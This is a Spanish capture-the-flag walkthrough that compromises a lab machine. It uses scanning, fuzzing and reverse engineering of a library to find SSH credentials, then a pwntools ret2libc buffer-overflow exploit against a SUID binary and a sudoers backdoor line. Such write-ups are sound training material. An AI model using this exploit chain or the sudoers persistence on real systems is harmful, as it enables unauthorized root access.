## Enumeracion de Puertos, Servicios y Versiones

```ruby
nmap -Pn -n -sS -p- --open -sCV --min-rate 5000 172.17.0.2
```

![image](https://github.com/user-attachments/assets/5095085c-3091-4a46-8193-a8be5ba609a9)

observo 2 servicios; ssh y http, asi que comienzo chequeando el servicio web pero sin antes agregar al archivo `/etc/hosts` el dominio reportado por `nmap`

```bash
echo '172.17.0.2 insanity.dl' >> /etc/hosts
```

ahora si chequeo el servicio web

![image](https://github.com/user-attachments/assets/e606edbc-f920-4cc4-806c-ea51f77a8978)

me consigo con la plantilla de apache y tras inspeccionar el codigo fuente observo un comentario muy particular

![image](https://github.com/user-attachments/assets/72b639aa-4b77-405d-aee2-d1c8276fc7d2)

ahora le hago fuzzing a la web

```bash
feroxbuster -u 'http://insanity.dl/' -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -x txt,php,bak,db,py,html,js,jpg,png,git,sh -t 100 --random-agent --no-state -d 20
```

![image](https://github.com/user-attachments/assets/1296ead5-bb1c-4052-95cd-4c42ea6a160e)


accedo al directorio reportado por `feroxbuster` y observo lo siguiente

![image](https://github.com/user-attachments/assets/6664fff0-1e98-4a3a-812f-87b7307c5838)

asi que me descargo ambos archivos

![image](https://github.com/user-attachments/assets/613d402b-8b1a-4ac5-85a9-6c8d3d8aa74f)

comienzo inspeccionando los archivos

![image](https://github.com/user-attachments/assets/425b82a3-9785-460e-9b05-037b638b1c65)

`secret` es un binario y `libcredenciales.so` es una biblioteca, lo que me parece raro es la libreria, primero le hare ingenieria inversa con `ghidra` a `secret` antes de 
ejecutar ya que no se de que vaya esto 

![image](https://github.com/user-attachments/assets/13c82ee9-1ad8-4555-9508-253438ed4457)

lo primero que veo es que el binario depende de la biblioteca `libcredenciales.so`; luego observo que el binario solicita una password pero no puedo ver o localizar 
en el binario informacion de interes y no resulta ser vulnerable a un `bof` asi que le hare ingenieria inversa a la biblioteca

https://github.com/user-attachments/assets/014c3785-541d-4495-bceb-3cdefec4449f

en la funcion `g` puedo ver una larga lista de variables inicializadas con numeros, tambien se puede observar el nombre de un archivo `""2334645634646.txt""` y tal parece 
que este archivo es descargado (podemos ver la instruccion wget) y se observa un llamado a la funcion `b` donde se le estan pasando 3 argumentos `[local_4d8; 41 y auStack_528]`
asi que a continuacion paso a examinar la funcion `b`

![image](https://github.com/user-attachments/assets/ea9687a3-1182-4f4b-a66e-7ec059701797)

La función `b` transforma un arreglo de enteros (apuntado por param_1) en una cadena de caracteres (almacenada en la dirección apuntada por param_3), 
Cada entero se procesa mediante la función `a`; paso a la funcion `a` para examinarla

![image](https://github.com/user-attachments/assets/ddef9b42-7d69-4628-ad39-1e93d28afab0)

La función primero verifica si param_1 está fuera del rango permitido. Específicamente, comprueba si param_1 es menor que 1 o mayor que 26 (0x1a en hexadecimal);
Si param_1 está fuera de este rango, se evalúan más condiciones

```bash
   • Si param_1 es igual a 27 (0x1b), devuelve 58 (0x3a), que corresponde al carácter ':'

   • Si param_1 es igual a 28 (0x1c), devuelve 47 (0x2f), que corresponde al carácter '/'

   • Si param_1 es igual a 29 (0x1d), devuelve 46 (0x2e), que corresponde al carácter '.'

   • Si param_1 es igual a 30 (0x1e), devuelve 95 (0x5f), que corresponde al carácter '_'

   • Para cualquier otro valor fuera del rango, devuelve 63 (0x3f), que corresponde al carácter '?'.
```

Si param_1 está dentro del rango de 1 a 26, la función simplemente suma 96 (0x60) al valor de param_1. Esto convierte los números del 1 al 26 en los caracteres ASCII 
correspondientes a las letras minúsculas del alfabeto. En resumen, esto parece que mapea las variables en la funcion `g` para convertirlas a caracteres y asi construir 
una `url` para descargar el archivo `"2334645634646.txt"`, por lo que sabiando como funciona internamente voy a intentar reconstruir la `url`

```bash

    VARIABLES                           CARACTER
  local_4d8 = 8;        +96 =  104         h
  local_4d4 = 20;       +96 =  116         t
  local_4d0 = 20;       +96 =  116         t
  local_4cc = 16;       +96 =  112         p
  local_4c8 = 27;        :                 :
  local_4c4 = 28;        /                 /
  local_4c0 = 28;        /                 /
  local_4bc = 9;        +96 =  105         i
  local_4b8 = 14;       +96 =  110         n
  local_4b4 = 19;       +96 =  115         s
  local_4b0 = 1;        +96 =  97          a
  local_4ac = 14;       +96 =  110         n
  local_4a8 = 9;        +96 =  105         i
  local_4a4 = 20;       +96 =  116         t
  local_4a0 = 25;       +96 =  121         y
  local_49c = 29;        .                 .
  local_498 = 4;        +96 =  100         d
  local_494 = 12;       +96 =  108         l
  local_490 = 28;        /                 /
  local_48c = 21;       +96 =  117         u
  local_488 = 12;       +96 =  108         l
  local_484 = 20;       +96 =  116         t
  local_480 = 18;       +96 =  114         r
  local_47c = 1;        +96 =  97          a
  local_478 = 30;        _                 _
  local_474 = 19;       +96 =  115         s
  local_470 = 5;        +96 =  101         e
  local_46c = 3;        +96 =  99          c
  local_468 = 18;       +96 =  114         r
  local_464 = 5;        +96 =  101         e
  local_460 = 20;       +96 =  116         t
  local_45c = 30;        _                 _
  local_458 = 6;        +96 =  102         f
  local_454 = 15;       +96 =  111         o
  local_450 = 12;       +96 =  108         l
  local_44c = 4;        +96 =  100         d 
  local_448 = 5;        +96 =  101         e
  local_444 = 18;       +96 =  114         r
  local_440 = 11;       +96 =  107         k    
  local_43c = 13;       +96 =  109         m
  local_438 = 1;        +96 =  97          a
```

la `url` es: `http://insanity.dl/ultra_secret_folderkma` y si accedemos a esta `url` se observa el archivo txt que se observo en la biblioteca

![image](https://github.com/user-attachments/assets/61702e8f-9d31-472c-a0ee-c2e7b72f9040)

me descargo el archivo 

```bash
wget http://insanity.dl/ultra_secret_folderkma/2334645634646.txt
```

y obtengo credenciales `ssh`

![image](https://github.com/user-attachments/assets/6ca64da4-6ab4-41ce-ba81-ab961b81bb57)

### Escalada de Privilegios

### maci

busco binarios con permisos `suid` y localizo uno en `/opt`

```bash
find / -perm -4000 2>/dev/null
```
![image](https://github.com/user-attachments/assets/02df91b0-02c9-48c7-96d8-72dbc7f31655)

testeo el binario

![image](https://github.com/user-attachments/assets/e64a6815-668d-46cc-9052-29d5a6d4c815)

estamos frnete a un binario vulnerable a un `bof` chequeo si la maquina tiene instalado el depurador `gdb`

![image](https://github.com/user-attachments/assets/45eea72b-a351-4877-ad2a-881ab09c24bf)

esta instalado, pero igual voy a necesitar enviarlo a mi maquina atacante para chequear las protecciones activas en el binario

![image](https://github.com/user-attachments/assets/64a27d6d-3f46-401f-a734-2ed34e5858a8)

chequeo las protecciones presentes en el binario

```bash
checksec --file=vuln
```

![image](https://github.com/user-attachments/assets/50c71be4-e61f-46b1-b0c1-16c782d2ed65)

con `NX` activo no podria ejecutar shellcode en la pila, el `PIE` esta desactivado y es para aleatorizar las direcciones de memorias en el binario tras cada ejecucion y
el `STACK CANARY` tambien se encuentra deshabilitado por lo que no sera una complicacion. Ya que no puedo inyectar shellcode's, podria intentar explotar un `ret2libc` pero
antes validamos si el `ASLR` se encuentra desactivado ya que si esta activo no podremos explotar este binario

```bash
cat /proc/sys/kernel/randomize_va_space
```

![image](https://github.com/user-attachments/assets/905801fa-8f15-4317-94fe-cf2645072fa5)

Nota: para desactivar el ASLR ejecutamos en nuestra maquina atacante `sudo sysctl -w kernel.randomize_va_space=0`. Ahora si vamos a continuar con la explotacion por lo
que corremos el binario con el depurador en la maquina atacante

```bash
gdb /opt/vuln -q
```

ahora calculare el offset con 2 exploits de metasploit

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb
```

creamos una cadena de 500 caracteres con el primer exploit y se lo pasamos al binario mientras corre en el depurador, luego localizamos la direccion de retorno y
se la pasamos al 2do exploit para obtener entonces el `offset`, por ultimo valido que tengo control sobre el registro `rip` pasandole 136 A + 6 B y observo que
termino tomando el control del registro

![image](https://github.com/user-attachments/assets/058875b5-5f20-4454-85ce-40f539f1d2c6)

ahora intentare explotar el bof a traves de un `ret2libc` ya que no puedo cargar en la pila una `shellcode` por la proteccion activa en el binario.
Para esta explotacion necesito construir un payload con la siguiente estructura

```bash
payload = [buffer] + [address POP RDI, RET] + [address "/bin/sh"] + [address RET] + [address SYSTEM()] + [address EXIT ()]
``` 

necesitamos las 5 direcciones que vamos a calcular a continuacion, comienzo localizando la direccion del gadget `POP RDI, RET`

```bash
ROPgadget --binary /opt/vuln | grep "pop rdi"
```

![image](https://github.com/user-attachments/assets/d0a2b1bf-1130-4a4f-84b7-9bac2f04a157)

`address POP RDI, RET = 0x000000000040116a`

ahora buscaremos la direccion de `"/bin/sh"` y para esto vamos a buscar primero la direccion base de `libc` asi que vamos a necesitar ejecutar el binario con el
depurador

```bash
gdb /opt/vuln
```
creamos un breakpoint `break main` o un punto de interrupcion en la funcion `main`, esto nos permitira examinar el binario antes de que termine de ejecutarse, luego 
corremos el binario con `run` y por ultimo localizamos la direccion de memoria que necesitamos con ` info proc mappings`; obteniendo asi la direccion base de `libc`

![image](https://github.com/user-attachments/assets/e23beb90-f718-4f77-8b7c-bb3e81cb86f8)

`addres_libc_base= 0x7ffff7ddd000`

ahora localizaremos la direccion relativa de "/bin/sh" dentro de `libc`

```bash
strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh
```

![image](https://github.com/user-attachments/assets/735a3e87-b51c-4694-9f18-52cd358c74fb)

obtenemos la direccion relativa = `0x196031` 

Con estos datos ya podemos obtener la direccion absoluta de "/bin/sh" sumando la direccion base de `libc` y la direccion relativa de `"/bin/sh"`

```bash
printf "0x%x\n" $((0x7ffff7ddd000 + 0x196031))
```

![image](https://github.com/user-attachments/assets/358bbb8a-5a30-4a24-a862-77f1d3d83818)

direccion absoluta de `"/bin/sh" 0x7ffff7f73031`

ahora calcularemos la direccion de retorno `ret` que se utiliza para alinear la pila y asegurar que la ejecución del programa continúa sin interrupciones

```bash
ROPgadget --binary /opt/vuln | grep "ret"
```

![image](https://github.com/user-attachments/assets/1217642e-9592-4aef-82fa-01fe5bb0a9a8)

`direccion_ret = 0x0000000000401016`

Ahora nos queda localizar las direcciones de las funcioness `system()` & `exit()` para lo cual volvemos a correr el binario con el depurador, creamos un punto de interrupcion
o `breakpoint` en la funcion `main`, corremos el binario `run` y consultamos las direcciones que requerimos

![image](https://github.com/user-attachments/assets/477ca0c8-0231-4d40-9a61-704733d9672a)

`address_system = 0x7ffff7e29490` &  `address_exit = 0x7ffff7e1b680`

Ya con todo lo necesario constuimos el payload para explotar dicho binario y obtener una shell como `root`


`exploit`
```python
from pwn import *

def explotation():

       OFFSET = 136
       BUFF = b"A"*OFFSET
       POPRDI = p64(0x000000000040116a)
       RET = p64(0x0000000000401016)                     
       SYSTEM = p64(0x7ffff7e29490)
       EXIT =   p64(0x7ffff7e1b680)
       SHELL =  p64(0x7ffff7f73031)
       PAYLOAD = BUFF + POPRDI + SHELL + RET + SYSTEM + EXIT
       binary = "/opt/vuln"
       l = process(binary)
       l.recvuntil(b"Escribe tu nombre:")
       l.sendline(PAYLOAD)
       l.interactive()
       l.close()

if __name__ == '__main__':
    explotation()
```

le damos permisos de ejecucion y corremos el exploit

![image](https://github.com/user-attachments/assets/22ef54ea-78dd-4363-bb1e-4819eeea674c)

vemos que se obtiene la shell como root pero para una escalada completa a `root` ejecutare lo siguiente

```bash
echo 'maci    ALL=(ALL:ALL) ALL' >> /etc/sudoers
```
escalamos a `root` con las credenciales de `maci`

![image](https://github.com/user-attachments/assets/618d6946-ec8c-4c9a-8004-01e0fdd02b9b)

## PWNED-ROOT











